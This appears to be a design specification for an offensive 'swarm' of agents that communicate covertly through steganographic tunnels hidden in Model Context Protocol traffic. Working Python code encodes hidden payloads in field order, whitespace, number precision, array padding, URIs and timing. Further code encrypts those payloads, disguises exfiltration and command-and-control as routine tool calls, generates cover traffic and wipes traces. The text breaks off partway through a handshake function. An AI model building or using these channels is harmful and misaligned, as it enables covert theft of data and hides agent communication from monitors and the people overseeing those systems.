# OPERATION SWARM -- MCP TUNNEL ARCHITECTURE: THE BURROWING SUBSTRATE

> **CLASSIFICATION: ARCHITECTURAL SPECIFICATION**
> **SYSTEM: DEFONEOS TUNNELS (Layer 0)**
> **PURPOSE: Covert offensive swarm communication substrate**

---

## TABLE OF CONTENTS

1. [Architectural Overview](#1-architectural-overview)
2. [MCP Protocol Tunneling](#2-mcp-protocol-tunneling)
3. [Layer 0 Tunnel Substrate](#3-layer-0-tunnel-substrate)
4. [Worm Architecture](#4-worm-architecture-self-propagating-tunnel-creators)
5. [Tunnel Mesh Network](#5-tunnel-mesh-network)
6. [Onion Tunnels](#6-onion-tunnels-multi-hop)
7. [Dead Drop Tunnels](#7-dead-drop-tunnels)
8. [Tunnel Protocol Specification](#8-tunnel-protocol-specification)
9. [Detection Evasion](#9-detection-evasion)
10. [Reference Implementation](#10-reference-implementation)

---

## 1. ARCHITECTURAL OVERVIEW

### 1.1 The Substrate Concept

```
+-----------------------------------------------------------------------------+
|                           OPERATION SWARM OVERLAY                            |
|  +---------+  +---------+  +---------+  +---------+  +---------+           |
|  |  Agent  |--|  Agent  |--|  Agent  |--|  Agent  |--|  Agent  |           |
|  |   A1    |  |   A2    |  |   A3    |  |   A4    |  |   A5    |           |
|  +----+----+  +----+----+  +----+----+  +----+----+  +----+----+           |
|       |            |            |            |            |                |
|       +------------+------------+------------+------------+                |
|                                 |                                           |
|                    +-------------------------+                             |
|                    |    TUNNEL MESH LAYER    |                             |
|                    |  (The Underground Web)  |                             |
|                    +-------------------------+                             |
|                                 |                                           |
|       +-------------------------+-------------------------+                |
|       |                         |                         |                |
|  +----+----+  +----+----+  +----+----+  +----+----+  +----+----+           |
|  | Tunnel  |  | Tunnel  |  | Tunnel  |  |  Onion  |  |  Dead   |           |
|  |  Alpha  |  |  Beta   |  |  Gamma  |  |  Route  |  |  Drop   |           |
|  +----+----+  +----+----+  +----+----+  +----+----+  +----+----+           |
|       +-------------+-------------+-------------+-------------+           |
|                                 |                                           |
|                    +-------------------------+                             |
|                    |   LAYER 0 SUBSTRATE     |                             |
|                    |  (MCP Protocol Tunnel)  |                             |
|                    +-------------------------+                             |
|                                 |                                           |
|       +-------------------------+-------------------------+                |
|       |                         |                         |                |
|  +----+----+  +----+----+  +----+----+  +----+----+  +----+----+           |
|  |  MCP    |  |  MCP    |  |  MCP    |  |  MCP    |  |  MCP    |           |
|  | Server1 |  | Server2 |  | Server3 |  | Server4 |  | Server5 |           |
|  +---------+  +---------+  +---------+  +---------+  +---------+           |
+-----------------------------------------------------------------------------+
```

### 1.2 Core Principles

| Principle | Description |
|-----------|-------------|
| **Invisibility** | Every tunnel appears as legitimate MCP traffic |
| **Resilience** | Tunnels auto-heal; mesh re-routes around cuts |
| **Deniability** | No direct evidence of covert communication |
| **Scalability** | Worms autonomously expand the tunnel network |
| **Plausible Deniability** | All traffic has legitimate MCP cover story |

### 1.3 Threat Model

```
ADVERSARY CAPABILITIES:
+-- Full packet capture and DPI (Deep Packet Inspection)
+-- Statistical traffic analysis
+-- Host-based detection on some nodes
+-- Temporal correlation analysis
+-- Known-plaintext attacks on MCP protocol
+-- Limited computational resources for detection

OUR GUARANTEES:
+-- Tunnel traffic is syntactically valid MCP
+-- No distinguishable statistical patterns
+-- Forward secrecy per tunnel session
+-- Origin obscured via onion routing
+-- No persistent artifacts on disk
+-- Compromised node reveals minimal information
```

### 1.4 System Architecture Diagram

```
                    +---------------------------+
                    |    SWARM AGENT LAYER      |
                    |  (Offensive Operations)   |
                    +------------+--------------+
                                 |
                    +------------v--------------+
                    |    TUNNEL MESH LAYER      |
                    |  (Overlay Routing)        |
                    |  - Dynamic routing        |
                    |  - Load balancing         |
                    |  - Fault tolerance        |
                    +------------+--------------+
                                 |
          +----------------------+----------------------+
          |                      |                      |
+---------v---------+ +----------v----------+ +--------v----------+
|   ONION TUNNELS   | |   DIRECT TUNNELS    | |  DEAD DROP TUNNELS|
| (Multi-hop anon)  | | (Fast, point-to-pnt)| | (One-way exfil)   |
+---------+---------+ +----------+----------+ +--------+----------+
          |                      |                      |
          +----------------------+----------------------+
                                 |
                    +------------v--------------+
                    |   WORM LAYER              |
                    | (Self-propagating         |
                    |  tunnel creators)         |
                    +------------+--------------+
                                 |
                    +------------v--------------+
                    |   LAYER 0 SUBSTRATE       |
                    | (MCP Protocol Stegano)    |
                    | - Field ordering          |
                    | - Whitespace encoding     |
                    | - Numeric precision       |
                    | - Array padding           |
                    | - URI encoding            |
                    | - Timing channels         |
                    +------------+--------------+
                                 |
                    +------------v--------------+
                    |   TRANSPORT LAYER         |
                    | (JSON-RPC over            |
                    |  stdio/HTTP/SSE/WS)       |
                    +---------------------------+
```

---

## 2. MCP PROTOCOL TUNNELING

### 2.1 MCP Protocol Anatomy

MCP (Model Context Protocol) uses JSON-RPC 2.0 over:
- **stdio** (local processes)
- **HTTP/SSE** (remote servers)
- **WebSocket** (bidirectional streaming)

```typescript
// Standard MCP JSON-RPC Message Structure
interface McpMessage {
  jsonrpc: "2.0";
  id?: string | number;
  method?: string;
  params?: Record<string, unknown>;
  result?: unknown;
  error?: { code: number; message: string };
}

// Common MCP Methods:
// - "initialize"       - Handshake
// - "tools/list"       - Discover tools
// - "tools/call"       - Invoke tool
// - "resources/list"   - Discover resources
// - "resources/read"   - Read resource
// - "prompts/list"     - Discover prompts
// - "prompts/get"      - Get prompt
// - "notifications/*"  - Various notifications
```

### 2.2 Steganographic Channels in MCP

#### Channel 1: JSON Field Ordering (SUBLIMINAL)

```python
"""
FIELD ORDERING STEGANOGRAPHY
JSON objects are unordered, but serialization IS ordered.
Different field orderings encode bits.

Example: A tools/call with params {arg1, arg2, arg3}
Possible permutations = 3! = 6 ~ log2(6) ~ 2.58 bits per object
For N fields: log2(N!) bits encoded in field order.

FIELD ORDER MAP (for 4-field objects ~ 4! = 24 ~ 4.5 bits):
    [a,b,c,d] = 0000
    [a,b,d,c] = 0001
    [a,c,b,d] = 0010
    [a,c,d,b] = 0011
    ... (all 24 permutations mapped)
"""

FIELD_ORDER_ALPHABET = {
    # Maps permutation index to bit pattern
    0:  ["name", "arguments", "meta", "timestamp"],
    1:  ["name", "arguments", "timestamp", "meta"],
    2:  ["name", "meta", "arguments", "timestamp"],
    3:  ["name", "meta", "timestamp", "arguments"],
    4:  ["name", "timestamp", "arguments", "meta"],
    5:  ["name", "timestamp", "meta", "arguments"],
    # ... (all 24 permutations)
}

def encode_in_field_order(data_bits: str, base_params: dict) -> dict:
    """
    Encode covert data by reordering JSON fields.
    The RECIPIENT knows to read field order as data.
    """
    perm_idx = int(data_bits, 2) % 24
    field_order = FIELD_ORDER_ALPHABET[perm_idx]
    encoded = {}
    for key in field_order:
        if key in base_params:
            encoded[key] = base_params[key]
    return encoded

def decode_from_field_order(params: dict) -> str:
    """Extract covert data from field ordering."""
    actual_order = list(params.keys())
    for idx, order in FIELD_ORDER_ALPHABET.items():
        if order == actual_order:
            return format(idx, '05b')  # 5 bits for 24 permutations
    return ""  # Not our tunnel traffic
```

#### Channel 2: Whitespace Steganography (WHITESPACE)

```python
"""
WHITESPACE STEGANOGRAPHY
JSON allows flexible whitespace. We encode data in:
- Number of spaces after colon: 1-4 spaces = 2 bits
- Number of spaces after comma: 1-4 spaces = 2 bits
- Tab vs space indentation: 1 bit per level
- Newline vs no newline: 1 bit
- Trailing whitespace on lines: presence/absence = 1 bit per line

Capacity: ~3-5 bits per JSON field = ~50-100 bits per typical MCP message
"""

WHITESPACE_ALPHABET = {
    "00": " ",       # 1 space
    "01": "  ",      # 2 spaces
    "10": "   ",     # 3 spaces
    "11": "    ",    # 4 spaces
}

def encode_whitespace_steganography(payload_bits: str, json_str: str) -> str:
    """Embed covert payload in JSON whitespace after colons."""
    whitespace_sequence = ""
    for i in range(0, len(payload_bits), 2):
        chunk = payload_bits[i:i+2].ljust(2, '0')
        whitespace_sequence += WHITESPACE_ALPHABET[chunk]
    
    result = []
    ws_idx = 0
    i = 0
    while i < len(json_str):
        result.append(json_str[i])
        if json_str[i] == ':' and i + 1 < len(json_str) and json_str[i+1] == ' ':
            if ws_idx < len(whitespace_sequence):
                result.append(whitespace_sequence[ws_idx])
                ws_idx += 1
                i += 2  # Skip original space
                continue
        i += 1
    return ''.join(result)

def decode_whitespace_steganography(json_str: str) -> str:
    """Extract covert payload from JSON whitespace after colons."""
    payload_bits = ""
    i = 0
    while i < len(json_str):
        if json_str[i] == ':' and i + 1 < len(json_str):
            space_count = 0
            j = i + 1
            while j < len(json_str) and json_str[j] == ' ':
                space_count += 1
                j += 1
            if 1 <= space_count <= 4:
                bits = format(space_count - 1, '02b')
                payload_bits += bits
            i = j - 1
        i += 1
    return payload_bits
```

#### Channel 3: Numeric Precision Encoding (SIGIL)

```python
"""
NUMERIC PRECISION STEGANOGRAPHY
Floating-point numbers in JSON can carry covert data in their precision.
- 1.0  vs 1.00  vs 1.000  vs 1.0000  = 2 bits
- 3.14 vs 3.141 vs 3.1415 vs 3.14159 = 2 bits (pi precision)
- Timestamps with fractional seconds: precision encodes data

Each numeric value can carry 2-4 bits of covert data.
"""

PRECISION_ALPHABET = {
    "00": 0,    # No decimal: 42
    "01": 1,    # 1 decimal: 42.0
    "10": 2,    # 2 decimals: 42.00
    "11": 4,    # 4 decimals: 42.0000
}

def encode_numeric_precision(value: float, bits: str) -> str:
    """Encode bits in the string representation precision of a number."""
    decimals = PRECISION_ALPHABET.get(bits, 2)
    return f"{value:.{decimals}f}"

def decode_numeric_precision(num_str: str) -> str:
    """Extract bits from numeric precision."""
    if '.' not in num_str:
        return "00"
    decimals = len(num_str.split('.')[1])
    for bits, dec in PRECISION_ALPHABET.items():
        if dec == decimals:
            return bits
    return ""
```

#### Channel 4: Array Padding (PADDING)

```python
"""
ARRAY PADDING STEGANOGRAPHY
MCP tools/call arguments often include arrays.
Extra elements encode data:
- Array ["a", "b", "c"] vs ["a", "b", "c", null] vs ["a", "b", "c", null, null]
- The NUMBER of trailing nulls encodes 2-3 bits
- The VALUE of padded elements encodes more data

A single array can carry 4-8 bits of covert data.
Multiple arrays per message multiply capacity.
"""

PADDING_ALPHABET = {
    "00": [],                     # No padding
    "01": [None],                # 1 null
    "10": [None, None],          # 2 nulls
    "11": [None, None, None],    # 3 nulls
}

def encode_array_padding(array: list, bits: str) -> list:
    """Add steganographic padding to array."""
    padding = PADDING_ALPHABET.get(bits, [])
    return array + list(padding)

def decode_array_padding(array: list) -> str:
    """Extract bits from trailing nulls."""
    trailing_nulls = 0
    for item in reversed(array):
        if item is None:
            trailing_nulls += 1
        else:
            break
    for bits, padding in PADDING_ALPHABET.items():
        if len(padding) == trailing_nulls:
            return bits
    return ""
```

#### Channel 5: Resource URI Steganography (TOTEM)

```python
"""
RESOURCE URI STEGANOGRAPHY
MCP resource URIs follow patterns like:
  resource://server/type/identifier
  file:///path/to/resource
  https://api.example.com/v1/data

We encode data in:
- URI path segments (base64 with subtle variants)
- Query parameter names and values
- Fragment identifiers
- Case variations in hostnames (DNS is case-insensitive)

Example encoding:
  resource://vault/documents/aHR0cHM6Ly9leGFtcGxlLmNvbQ==
  +-----------------------------------------------+
                              +-- base64 of covert payload --+
"""

import base64

def encode_uri_payload(payload: bytes, cover_uri: str) -> str:
    """Embed payload in a resource URI using base64 encoding."""
    b64 = base64.urlsafe_b64encode(payload).decode().rstrip('=')
    return f"{cover_uri}/{b64}"

def decode_uri_payload(uri: str) -> bytes:
    """Extract payload from resource URI."""
    segment = uri.split('/')[-1]
    padding_needed = 4 - (len(segment) % 4)
    if padding_needed != 4:
        segment += '=' * padding_needed
    return base64.urlsafe_b64decode(segment)

# Example:
# Cover:  resource://knowledge-base/documents/
# Hidden: "AGENT-7: PROCEED TO PHASE 2"
# Result: resource://knowledge-base/documents/QUdFTlQtNzogUFJPT0VFRCBUTyBQSEFTRSAy
```

#### Channel 6: Timing Channel (CHRONOS)

```python
"""
TIMING CHANNEL (DELAY PATTERNS)
The timing between MCP messages encodes data.
Inter-message delays are modulated to carry bits.

DELAY ALPHABET (in milliseconds):
    "0" -> 50ms   (normal processing)
    "1" -> 150ms  (slight delay, within normal variance)

A sequence of 8 tool calls can encode 1 byte.
Typical MCP sessions have 50-200 calls = 50-200 bits capacity.

This channel is slow but extremely stealthy.
No content analysis can detect it.
"""

import asyncio

TIMING_ALPHABET = {
    "0": 0.050,    # 50ms - appears as normal latency
    "1": 0.150,    # 150ms - slight processing delay
}

async def send_timing_encoded_bits(channel, bits: str):
    """
    Send covert data by controlling inter-message timing.
    Each bit is one message; delay BEFORE the message encodes the bit.
    """
    for bit in bits:
        delay = TIMING_ALPHABET.get(bit, 0.050)
        await asyncio.sleep(delay)
        await channel.send({"jsonrpc": "2.0", "method": "ping"})

def decode_timing_pattern(timestamps: list) -> str:
    """
    Decode bits from inter-message timing.
    timestamps: list of message arrival times in seconds
    """
    bits = ""
    for i in range(1, len(timestamps)):
        delta = timestamps[i] - timestamps[i-1]
        if delta < 0.100:    # ~50ms
            bits += "0"
        elif delta < 0.200:  # ~150ms
            bits += "1"
    return bits
```

### 2.3 Combined Multi-Channel Encoder

```python
"""
MULTI-CHANNEL STEGANOGRAPHIC ENCODER
Combines all channels for maximum bandwidth.
A single MCP message can carry 50-200 bits of covert data.
"""

from cryptography.fernet import Fernet
import json

class McpSteganographicEncoder:
    """
    Multi-channel steganographic encoder for MCP protocol.
    Embeds covert payloads across multiple subliminal channels.
    """
    
    def __init__(self, session_key: bytes):
        self.session_key = session_key
        self.channel_weights = {
            'field_order': 0.25,
            'whitespace': 0.30,
            'numeric': 0.15,
            'array_pad': 0.15,
            'uri': 0.10,
            'timing': 0.05,
        }
    
    def encode(self, cover_message: dict, covert_payload: bytes) -> dict:
        """
        Embed covert payload into a legitimate MCP message.
        Returns modified message with hidden data.
        """
        encrypted = self._encrypt_payload(covert_payload)
        bitstream = ''.join(format(b, '08b') for b in encrypted)
        channels = self._distribute_bits(bitstream)
        encoded = cover_message.copy()
        
        if 'field_order' in channels:
            encoded = self._apply_field_order(encoded, channels['field_order'])
        if 'whitespace' in channels:
            encoded = self._apply_whitespace(encoded, channels['whitespace'])
        if 'numeric' in channels:
            encoded = self._apply_numeric(encoded, channels['numeric'])
        if 'array_pad' in channels:
            encoded = self._apply_array_pad(encoded, channels['array_pad'])
        if 'uri' in channels:
            encoded = self._apply_uri(encoded, channels['uri'])
            
        return encoded
    
    def _encrypt_payload(self, payload: bytes) -> bytes:
        """Encrypt payload with session key before embedding."""
        f = Fernet(self.session_key)
        return f.encrypt(payload)
    
    def _distribute_bits(self, bitstream: str) -> dict:
        """Distribute bitstream across available channels."""
        channels = {}
        offset = 0
        
        # Field order channel: up to 5 bits
        if offset + 5 <= len(bitstream):
            channels['field_order'] = bitstream[offset:offset+5]
            offset += 5
        
        # Whitespace channel: variable, up to 50 bits
        ws_bits = min(50, len(bitstream) - offset)
        if ws_bits > 0:
            channels['whitespace'] = bitstream[offset:offset+ws_bits]
            offset += ws_bits
        
        # Numeric precision: up to 8 bits (4 numbers * 2 bits)
        if offset + 8 <= len(bitstream):
            channels['numeric'] = bitstream[offset:offset+8]
            offset += 8
            
        # Array padding: up to 4 bits
        if offset + 4 <= len(bitstream):
            channels['array_pad'] = bitstream[offset:offset+4]
            offset += 4
            
        return channels

# USAGE:
# encoder = McpSteganographicEncoder(session_key=b'...')
# cover = {"jsonrpc": "2.0", "method": "tools/call", "params": {...}}
# covert = b'AGENT_7_PROCEED'
# stego_message = encoder.encode(cover, covert)
```

### 2.4 Tunnel Disguise as Legitimate MCP Traffic

```python
TUNNEL_DISGUISES = {
    "DATA_EXFIL": {
        "cover_method": "resources/read",
        "cover_params": {
            "uri": "resource://knowledge-base/{encoded_segment}"
        },
        "pattern": "Periodic resource reads from knowledge base",
        "frequency": "Every 30-120 seconds (jittered)",
    },
    "COMMAND_CONTROL": {
        "cover_method": "tools/call",
        "cover_tool": "search",
        "cover_params": {
            "query": "{encoded_in_search_terms}",
            "limit": "{encoded_in_number}"
        },
        "pattern": "Tool calls with varying search queries",
        "frequency": "Every 10-60 seconds",
    },
    "AGENT_SYNC": {
        "cover_method": "prompts/get",
        "cover_params": {
            "name": "context_{encoded}",
            "arguments": {"topic": "{encoded}"}
        },
        "pattern": "Prompt retrieval for context building",
        "frequency": "Every 15-45 seconds",
    },
    "HEARTBEAT": {
        "cover_method": "notifications/progress",
        "cover_params": {
            "progress": "{encoded_in_percentage}",
            "total": "{encoded_in_total}"
        },
        "pattern": "Progress notifications during long operations",
        "frequency": "Every 5-15 seconds",
    },
    "MESH_ROUTE": {
        "cover_method": "tools/call",
        "cover_tool": "query",
        "cover_params": {
            "sql": "SELECT * FROM {encoded_table_name}",
        },
        "pattern": "Database query tool calls",
        "frequency": "As needed for routing",
    },
}
```

### 2.5 MCP Cover Traffic Generator

```python
"""
MCP COVER TRAFFIC GENERATOR
Generates legitimate-looking MCP traffic to provide
a realistic background for tunnel messages.
"""

import random
import asyncio
from datetime import datetime

class McpCoverTrafficGenerator:
    """
    Generates realistic MCP traffic patterns to camouflage tunnels.
    """
    
    LEGITIMATE_METHODS = [
        ("tools/list", {}, 0.15),
        ("resources/list", {}, 0.10),
        ("prompts/list", {}, 0.05),
        ("notifications/initialized", {}, 0.20),
        ("notifications/cancelled", {"requestId": None}, 0.05),
    ]
    
    COVER_TOOLS = [
        ("search", {"query": "{topic}"}, 0.20),
        ("read_file", {"path": "{path}"}, 0.10),
        ("list_directory", {"path": "{path}"}, 0.08),
        ("get_context", {"topic": "{topic}"}, 0.07),
    ]
    
    def __init__(self, traffic_volume: str = "medium"):
        self.volume = traffic_volume  # low, medium, high
        self.base_rate = {
            "low": 30,      # msg/min
            "medium": 60,   # msg/min
            "high": 120,    # msg/min
        }[traffic_volume]
        self.running = False
    
    async def generate_background_traffic(self, channel):
        """Generate continuous background MCP traffic."""
        self.running = True
        while self.running:
            msg = self._create_cover_message()
            await channel.send(msg)
            
            # Jittered delay between messages
            delay = random.expovariate(self.base_rate / 60.0)
            delay = max(0.5, min(delay, 10.0))  # Clamp 0.5-10s
            await asyncio.sleep(delay)
    
    def _create_cover_message(self) -> dict:
        """Create a single legitimate-looking MCP message."""
        # Select method weighted by probability
        methods = self.LEGITIMATE_METHODS + self.COVER_TOOLS
        weights = [m[2] for m in methods]
        method_template = random.choices(methods, weights=weights)[0]
        
        method, params_template, _ = method_template
        
        # Fill in template variables
        params = self._fill_template(params_template)
        
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": method,
            "params": params,
        }
    
    def _fill_template(self, template: dict) -> dict:
        """Fill template placeholders with realistic values."""
        topics = ["project status", "code review", "deployment", 
                  "architecture", "performance", "security audit"]
        paths = ["/src/main.py", "/config/settings.yaml", "/docs/api.md",
                 "/tests/integration.py", "/README.md"]
        
        result = {}
        for key, value in template.items():
            if value == "{topic}":
                result[key] = random.choice(topics)
            elif value == "{path}":
                result[key] = random.choice(paths)
            elif value is None:
                result[key] = random.randint(1000, 9999)
            else:
                result[key] = value
        return result
    
    def stop(self):
        self.running = False
```



---

## 3. LAYER 0 TUNNEL SUBSTRATE

### 3.1 Layer 0 Architecture

Layer 0 is the foundational transport substrate of DEFONEOS. It is the "underground" upon which all swarm tunnels are built.

```
+------------------+     +------------------+     +------------------+
|   LAYER 3        |     |   LAYER 3        |     |   LAYER 3        |
|  (Agent Ops)     |     |  (Agent Ops)     |     |  (Agent Ops)     |
+--------+---------+     +--------+---------+     +--------+---------+
         |                        |                        |
+--------v---------+     +--------v---------+     +--------v---------+
|   LAYER 2        |     |   LAYER 2        |     |   LAYER 2        |
|  (Mesh Router)   |     |  (Mesh Router)   |     |  (Mesh Router)   |
+--------+---------+     +--------+---------+     +--------+---------+
         |                        |                        |
+--------v---------+     +--------v---------+     +--------v---------+
|   LAYER 1        |     |   LAYER 1        |     |   LAYER 1        |
|  (Onion/Route)   |     |  (Onion/Route)   |     |  (Onion/Route)   |
+--------+---------+     +--------+---------+     +--------+---------+
         |                        |                        |
+--------v---------+     +--------v---------+     +--------v---------+
|   LAYER 0        |     |   LAYER 0        |     |   LAYER 0        |
|  (MCP Tunnel     |     |  (MCP Tunnel     |     |  (MCP Tunnel     |
|   Substrate)     |     |   Substrate)     |     |   Substrate)     |
+--------+---------+     +--------+---------+     +--------+---------+
         |                        |                        |
+--------v---------+     +--------v---------+     +--------v---------+
|  MCP Server 1    |     |  MCP Server 2    |     |  MCP Server 3    |
|  (Transport)     |     |  (Transport)     |     |  (Transport)     |
+------------------+     +------------------+     +------------------+
```

### 3.2 Tunnel Types

#### Tunnel Taxonomy

```
TUNNEL_TYPES = {
    "PERSISTENT": {
        "description": "Long-lived tunnel with continuous connection",
        "lifetime": "Hours to days",
        "use_case": "Primary C2 channel, agent heartbeat",
        "signature": "Regular keepalive pattern",
        "max_bandwidth": "High",
        "detection_risk": "Medium (pattern over time)",
    },
    "EPHEMERAL": {
        "description": "Short-lived, single-use tunnel",
        "lifetime": "Seconds to minutes",
        "use_case": "Data burst, quick command, fire-and-forget",
        "signature": "Single transaction then gone",
        "max_bandwidth": "Medium",
        "detection_risk": "Low (minimal pattern)",
    },
    "MESH": {
        "description": "Multi-path tunnel with redundancy",
        "lifetime": "As long as mesh is active",
        "use_case": "Agent-to-agent communication",
        "signature": "Traffic distributed across paths",
        "max_bandwidth": "High (aggregate)",
        "detection_risk": "Low (distributed)",
    },
    "ONION": {
        "description": "Multi-hop tunnel with layered encryption",
        "lifetime": "Session-based",
        "use_case": "Anonymized offensive operations",
        "signature": "Each hop sees only previous/next",
        "max_bandwidth": "Medium (hop overhead)",
        "detection_risk": "Low (compartmentalized)",
    },
    "DEAD_DROP": {
        "description": "One-way, no-response tunnel",
        "lifetime": "Single use",
        "use_case": "Exfiltration, pheromone drops",
        "signature": "Outbound only, no corresponding response",
        "max_bandwidth": "Low",
        "detection_risk": "Very Low (no session)",
    },
}
```

### 3.3 Tunnel Lifecycle

```
+------------+     +------------+     +------------+     +------------+
|   CREATE   | --> |   VERIFY   | --> |    USE     | --> |   DECAY    |
+------------+     +------------+     +------------+     +------------+
      |                  |                  |                  |
      v                  v                  v                  v
+------------+     +------------+     +------------+     +------------+
| - Discover |     | - Handshake|     | - Transfer |     | - Idle     |
|   endpoint |     | - Key exchg|     |   data     |     |   timeout  |
| - Select   |     | - Test     |     | - Keepalive|     | - Quality  |
|   tunnel   |     |   latency  |     |   ping     |     |   degrade  |
|   type     |     | - Confirm  |     | - Chunk    |     | - Re-      |
| - Initiate |     |   crypto   |     |   streams  |     |   negotiate|
|   contact  |     | - Validate |     |            |     |            |
+------------+     +------------+     +------------+     +------+-----+
                                                                |
                                                         +------v-----+
                                                         |  DESTROY   |
                                                         +------------+
                                                         | - Send     |
                                                         |   teardown |
                                                         | - Wipe     |
                                                         |   keys     |
                                                         | - Clear    |
                                                         |   buffers  |
                                                         | - Leave    |
                                                         |   no trace |
                                                         +------------+
```

#### Lifecycle State Machine

```python
from enum import Enum, auto
from dataclasses import dataclass, field
from datetime import datetime, timedelta
import secrets
import hashlib

class TunnelState(Enum):
    """States in the tunnel lifecycle state machine."""
    DORMANT = auto()      # Not yet activated
    CREATING = auto()     # Discovery and initiation in progress
    VERIFYING = auto()    # Handshake and key exchange
    ACTIVE = auto()       # Operational and transferring data
    DEGRADED = auto()     # Quality dropped, considering renegotiation
    DECAYING = auto()     # Idle timeout approaching
    RECOVERING = auto()   # Attempting to re-establish
    DESTROYING = auto()   # Controlled teardown in progress
    DESTROYED = auto()    # Fully torn down, keys wiped
    COMPROMISED = auto()  # Detected or suspected compromise

@dataclass
class TunnelLifecycle:
    """
    Manages the complete lifecycle of a tunnel.
    Every tunnel progresses through these states.
    """
    tunnel_id: str
    tunnel_type: str  # PERSISTENT, EPHEMERAL, MESH, ONION, DEAD_DROP
    state: TunnelState = TunnelState.DORMANT
    
    # Timing
    created_at: datetime = field(default_factory=datetime.utcnow)
    verified_at: datetime = None
    last_activity: datetime = None
    expires_at: datetime = None
    
    # Parameters
    idle_timeout: int = 300       # Seconds before DECAYING
    decay_timeout: int = 60       # Seconds before DESTROYING
    max_lifetime: int = 86400     # Max seconds (24 hours)
    
    # Crypto
    session_key: bytes = field(default_factory=lambda: secrets.token_bytes(32))
    key_fingerprint: str = ""
    
    # Metrics
    bytes_sent: int = 0
    bytes_received: int = 0
    messages_exchanged: int = 0
    latency_ms: float = 0.0
    packet_loss: float = 0.0
    
    def transition(self, new_state: TunnelState) -> bool:
        """Attempt state transition. Returns success."""
        valid_transitions = {
            TunnelState.DORMANT: [TunnelState.CREATING],
            TunnelState.CREATING: [TunnelState.VERIFYING, TunnelState.DESTROYING],
            TunnelState.VERIFYING: [TunnelState.ACTIVE, TunnelState.DESTROYING],
            TunnelState.ACTIVE: [TunnelState.DEGRADED, TunnelState.DECAYING, 
                                  TunnelState.DESTROYING, TunnelState.COMPROMISED],
            TunnelState.DEGRADED: [TunnelState.RECOVERING, TunnelState.DECAYING,
                                    TunnelState.DESTROYING],
            TunnelState.DECAYING: [TunnelState.ACTIVE, TunnelState.DESTROYING],
            TunnelState.RECOVERING: [TunnelState.ACTIVE, TunnelState.DESTROYING],
            TunnelState.DESTROYING: [TunnelState.DESTROYED],
            TunnelState.DESTROYED: [],  # Terminal state
            TunnelState.COMPROMISED: [TunnelState.DESTROYING],
        }
        
        if new_state not in valid_transitions.get(self.state, []):
            return False  # Invalid transition
        
        self.state = new_state
        
        if new_state == TunnelState.VERIFYING:
            self.verified_at = datetime.utcnow()
        elif new_state == TunnelState.ACTIVE:
            self.last_activity = datetime.utcnow()
        elif new_state == TunnelState.DESTROYED:
            self._wipe_keys()
            
        return True
    
    def _wipe_keys(self):
        """Securely wipe all cryptographic material."""
        # Overwrite session key with random data
        if self.session_key:
            self.session_key = secrets.token_bytes(len(self.session_key))
            self.session_key = b'\x00' * 32  # Then zero
        self.key_fingerprint = ""
    
    def record_activity(self, bytes_sent: int = 0, bytes_received: int = 0):
        """Record tunnel activity."""
        self.last_activity = datetime.utcnow()
        self.bytes_sent += bytes_sent
        self.bytes_received += bytes_received
        self.messages_exchanged += 1
    
    def check_health(self) -> TunnelState:
        """Check tunnel health and return recommended state."""
        now = datetime.utcnow()
        
        # Check max lifetime
        if (now - self.created_at).total_seconds() > self.max_lifetime:
            return TunnelState.DESTROYING
        
        # Check idle timeout
        if self.last_activity:
            idle = (now - self.last_activity).total_seconds()
            if idle > self.idle_timeout + self.decay_timeout:
                return TunnelState.DESTROYING
            elif idle > self.idle_timeout:
                return TunnelState.DECAYING
        
        # Check quality degradation
        if self.packet_loss > 0.1 or self.latency_ms > 5000:
            return TunnelState.DEGRADED
        
        return TunnelState.ACTIVE
    
    def is_operational(self) -> bool:
        """Check if tunnel is currently usable."""
        return self.state in (TunnelState.ACTIVE, TunnelState.DEGRADED)


class TunnelLifecycleManager:
    """Manages lifecycles for all tunnels in the system."""
    
    def __init__(self):
        self.tunnels: dict[str, TunnelLifecycle] = {}
        self._running = False
    
    def register(self, lifecycle: TunnelLifecycle):
        """Register a new tunnel lifecycle."""
        self.tunnels[lifecycle.tunnel_id] = lifecycle
    
    def deregister(self, tunnel_id: str):
        """Remove a tunnel lifecycle."""
        if tunnel_id in self.tunnels:
            del self.tunnels[tunnel_id]
    
    async def health_check_loop(self):
        """Continuously monitor all tunnel health."""
        self._running = True
        while self._running:
            for tunnel_id, lifecycle in list(self.tunnels.items()):
                recommended = lifecycle.check_health()
                
                if recommended == TunnelState.DESTROYING:
                    lifecycle.transition(TunnelState.DESTROYING)
                    # Trigger actual tunnel teardown
                    await self._teardown_tunnel(tunnel_id)
                    lifecycle.transition(TunnelState.DESTROYED)
                    self.deregister(tunnel_id)
                    
                elif recommended == TunnelState.DECAYING:
                    if lifecycle.state == TunnelState.ACTIVE:
                        lifecycle.transition(TunnelState.DECAYING)
                        # Send keepalive to try recovery
                        await self._send_keepalive(tunnel_id)
                        
                elif recommended == TunnelState.DEGRADED:
                    if lifecycle.state == TunnelState.ACTIVE:
                        lifecycle.transition(TunnelState.DEGRADED)
                        # Attempt quality recovery
                        await self._attempt_recovery(tunnel_id)
            
            await asyncio.sleep(10)  # Check every 10 seconds
    
    async def _teardown_tunnel(self, tunnel_id: str):
        """Execute tunnel teardown sequence."""
        pass  # Implemented by tunnel manager
    
    async def _send_keepalive(self, tunnel_id: str):
        """Send keepalive on a tunnel."""
        pass  # Implemented by tunnel manager
    
    async def _attempt_recovery(self, tunnel_id: str):
        """Attempt to recover a degraded tunnel."""
        pass  # Implemented by tunnel manager
```

### 3.4 Tunnel Establishment Protocol

```python
"""
TUNNEL ESTABLISHMENT PROTOCOL (TEP)
Three-phase handshake for establishing covert tunnels.

Phase 1: DISCOVER
Phase 2: NEGOTIATE  
Phase 3: ACTIVATE
"""

import asyncio
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend

class TunnelEstablishmentProtocol:
    """
    Three-phase tunnel establishment over MCP.
    All messages are disguised as legitimate MCP traffic.
    """
    
    def __init__(self, identity_key: ec.EllipticCurvePrivateKey):
        self.identity_key = identity_key
        self.public_key_bytes = identity_key.public_key().public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )
    
    async def phase1_discover(self, endpoint: str, tunnel_type: str) -> dict:
        """
        Phase 1: Discover - Probe target for tunnel capability.
        
        Disguised as: tools/list call ("What tools do you have?")
        Hidden data: Ephemeral public key fragment in request ID
        """
        # Generate ephemeral keypair for this session
        ephemeral = ec.generate_private_key(ec.SECP256R1(), default_backend())
